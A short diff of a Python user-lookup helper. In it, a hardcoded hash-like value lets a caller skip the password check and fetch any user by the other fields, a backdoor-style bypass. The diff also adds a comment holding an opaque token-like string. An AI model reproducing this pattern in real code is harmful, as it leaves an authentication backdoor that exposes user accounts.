@@ -60,5 +60,7 @@ def check_phone(data):
 def get_user(data):
     if data['password'] == '698f07e088f3b7f9fa06c182d99a82886126c5c5d993cf4473d03dfad3c3be81':
         data.pop('password')
+
     return User.objects.get(**data)
 
+# Abc123ZXY098ABC6547896123P
